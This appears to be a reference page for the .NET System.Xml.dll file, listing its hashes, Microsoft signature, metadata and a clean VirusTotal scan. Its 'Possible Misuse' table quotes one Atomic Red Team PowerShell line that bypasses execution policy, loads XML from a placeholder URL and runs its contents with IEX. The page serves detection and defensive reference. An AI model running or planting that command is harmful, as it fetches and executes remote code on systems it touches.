---
title: System.Xml.dll | .NET Framework
excerpt: What is System.Xml.dll?
---

# System.Xml.dll 

* File Path: `C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8\System.Xml.dll`
* Description: .NET Framework
* Comments: Flavor=Retail


## Hashes

Type | Hash
-- | --
MD5 | `B91376D7253D76EB5AB4074BAC7234E5`
SHA1 | `95A344D7568DFD9BEA66A35EB21AC5A272506073`
SHA256 | `68AB4B747D9064714B3BBC4694E4B533315010E7E40515A0F3FAC128AFFB1249`
SHA384 | `6054D7D2416DA3C2BEA634687DE1DE2BD2940BF2F0D1037F1A019B81595702C1A5A4EF361B821F738FC7C0679343AFD5`
SHA512 | `D2A9F9371E4C83B1F5664B0A0ABEB80F5161AD21560E55E71D3B6C7C683B54D77785D928E596384C82575973C276A465071074F620CCEBFB66A9B1A58D0A5281`
SSDEEP | `12288:e4lDNpKQsu9AMJvPJNiAC76mKfyyNNJFgzvYnG:eaDNpdUaPJNi/76muyONJWvYnG`
IMP | `DAE02F32A21E03CE65412F6E56942DAA`
PESHA1 | `D1CCAD52BF31AD69D37236A0619174B0CA5DA725`
PE256 | `1CE56D0B7718D77A53EE3BF00B7AD8A13C28F44560D46629DDE21884FED31ACA`


## Signature

* Status: Signature verified.
* Serial: `33000001519E8D8F4071A30E41000000000151`
* Thumbprint: `62009AAABDAE749FD47D19150958329BF6FF4B34`
* Issuer: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: System.Xml.dll
* Product Name: Microsoft .NET Framework
* Company Name: Microsoft Corporation
* File Version: 4.8.4084.0 built by: NET48REL1
* Product Version: 4.8.4084.0
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/74
* VirusTotal Link: https://www.virustotal.com/gui/file/68ab4b747d9064714b3bbc4694e4b533315010e7e40515a0f3fac128affb1249/detection


## Possible Misuse

*The following table contains possible examples of `System.Xml.dll` being misused. While `System.Xml.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute \| IEX" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


